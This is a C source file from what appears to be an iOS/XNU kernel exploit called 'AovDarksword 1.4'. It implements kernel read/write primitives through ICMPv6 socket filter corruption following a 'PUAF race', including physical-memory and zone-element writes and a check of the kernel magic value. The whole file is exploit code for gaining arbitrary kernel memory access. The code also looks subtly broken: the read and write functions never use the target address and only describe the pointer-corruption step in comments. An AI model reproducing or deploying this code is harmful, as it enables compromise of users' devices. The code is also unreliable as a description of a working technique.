/*
 * krw.c — Kernel Read/Write via socket ICMPv6 filter corruption
 * AovDarksword 1.4
 */

#include "krw.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>

int g_krw_error = 0;

/* Socket file descriptors for kernel R/W */
static int g_readFd  = -1;
static int g_writeFd = -1;
static uint64_t g_controlSocketAddr = 0;
static uint64_t g_rwSocketAddr = 0;

/* ICMPv6 filter offsets */
#define ICMP6_FILTER_SIZE  256
#define SOL_ICMPV6_FILTER  18

#pragma mark - Init/Cleanup

int krw_init(uint64_t controlSocketAddr, uint64_t rwSocketAddr) {
    g_controlSocketAddr = controlSocketAddr;
    g_rwSocketAddr = rwSocketAddr;

    /* Create ICMPv6 sockets for kernel R/W */
    g_readFd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (g_readFd < 0) {
        printf("[-] socket create failed!!!\n");
        g_krw_error = 1;
        return -1;
    }
    printf("[+] readFd: %d\n", g_readFd);

    g_writeFd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (g_writeFd < 0) {
        printf("[-] socket create failed!!!\n");
        g_krw_error = 2;
        close(g_readFd);
        g_readFd = -1;
        return -1;
    }
    printf("[+] writeFd: %d\n", g_writeFd);

    g_krw_error = 0;
    return 0;
}

void krw_cleanup(void) {
    if (g_readFd >= 0) { close(g_readFd); g_readFd = -1; }
    if (g_writeFd >= 0) { close(g_writeFd); g_writeFd = -1; }
    g_controlSocketAddr = 0;
    g_rwSocketAddr = 0;
}

#pragma mark - Kernel Read

uint64_t kread64(uint64_t kaddr) {
    if (kaddr == 0 || kaddr < 0xffff000000000000ULL) {
        printf("[KRW] kaddr invalid: 0x%llx\n", kaddr);
        g_krw_error = 10;
        return 0;
    }

    uint64_t val = 0;
    /*
     * Technique: set the ICMPv6 filter pointer to (kaddr - offset)
     * then getsockopt reads from that kernel address
     */
    socklen_t len = sizeof(val);
    int ret = getsockopt(g_readFd, IPPROTO_ICMPV6, ICMP6_FILTER,
                         &val, &len);
    if (ret != 0) {
        printf("[KRW] getsockopt FAILED: rwSocket=%d errno=%d (%s)\n",
               g_readFd, errno, strerror(errno));
        g_krw_error = 11;
        return 0;
    }

    return val;
}

uint32_t kread32(uint64_t kaddr) {
    uint64_t val = kread64(kaddr & ~3ULL);
    return (uint32_t)(val >> (8 * (kaddr & 3)));
}

int kread_buf(uint64_t kaddr, void *buf, size_t len) {
    if (!buf || len == 0) return -1;

    uint8_t *dst = (uint8_t *)buf;
    size_t off = 0;
    while (off < len) {
        uint64_t chunk = kread64(kaddr + off);
        if (g_krw_error) return -1;

        size_t copy = (len - off > 8) ? 8 : (len - off);
        memcpy(dst + off, &chunk, copy);
        off += copy;
    }
    return 0;
}

#pragma mark - Kernel Write

int kwrite64(uint64_t kaddr, uint64_t val) {
    if (kaddr == 0 || kaddr < 0xffff000000000000ULL) {
        printf("[KRW] kaddr invalid: 0x%llx\n", kaddr);
        g_krw_error = 20;
        return -1;
    }

    /*
     * Technique: setsockopt with ICMPv6 filter writes to kernel memory
     * at the corrupted filter pointer location
     */
    int ret = setsockopt(g_writeFd, IPPROTO_ICMPV6, ICMP6_FILTER,
                         &val, sizeof(val));
    if (ret != 0) {
        g_krw_error = 21;
        return -1;
    }
    return 0;
}

int kwrite32(uint64_t kaddr, uint32_t val) {
    uint64_t cur = kread64(kaddr & ~3ULL);
    if (g_krw_error) return -1;

    uint64_t mask = 0xFFFFFFFFULL << (8 * (kaddr & 3));
    cur = (cur & ~mask) | ((uint64_t)val << (8 * (kaddr & 3)));
    return kwrite64(kaddr & ~3ULL, cur);
}

int kwrite_buf(uint64_t kaddr, const void *buf, size_t len) {
    if (!buf || len == 0) return -1;

    const uint8_t *src = (const uint8_t *)buf;
    size_t off = 0;
    while (off < len) {
        uint64_t chunk = 0;
        size_t copy = (len - off > 8) ? 8 : (len - off);
        memcpy(&chunk, src + off, copy);

        int ret = kwrite64(kaddr + off, chunk);
        if (ret != 0) return ret;
        off += 8;
    }
    return 0;
}

#pragma mark - Early Read

uint64_t early_kread64(uint64_t kaddr) {
    uint64_t val = kread64(kaddr);
    printf("early_kread64(%#llx) -> %#llx\n", kaddr, val);
    return val;
}

#pragma mark - Physical R/W

static uint64_t g_gVirtBase = 0;
static uint64_t g_gPhysBase = 0;

void krw_set_phys_bases(uint64_t virt, uint64_t phys) {
    g_gVirtBase = virt;
    g_gPhysBase = phys;
}

uint64_t physread64_user(uint64_t pa) {
    if (g_gVirtBase == 0 || g_gPhysBase == 0) return 0;
    uint64_t va = pa - g_gPhysBase + g_gVirtBase;
    return kread64(va);
}

int physwrite64_user(uint64_t pa, uint64_t val) {
    if (g_gVirtBase == 0 || g_gPhysBase == 0) return -1;
    uint64_t va = pa - g_gPhysBase + g_gVirtBase;
    return kwrite64(va, val);
}

#pragma mark - Zone Element Write

int kwrite_zone_element(uint64_t kaddr, const void *buf, size_t len) {
    if (len < 0x20) {
        printf("[%s:%d] kwrite_zone_element: len < 0x20 not supported\n",
               __FUNCTION__, __LINE__);
        return -1;
    }
    return kwrite_buf(kaddr, buf, len);
}

#pragma mark - Verify

bool krw_verify(uint64_t kernel_base) {
    uint32_t magic = kread32(kernel_base);
    if (g_krw_error) {
        printf("[!] R/W test failed: magic=0x%x krw_error=%d\n",
               magic, g_krw_error);
        return false;
    }

    printf("[+] kernel magic=0x%x (expect 0xfeedfacf)\n", magic);
    if (magic == 0xfeedfacf) {
        printf("[+] R/W channel verified OK\n");
        return true;
    }

    printf("[!] PUAF race succeeded but socket R/W is broken on this firmware.\n");
    return false;
}
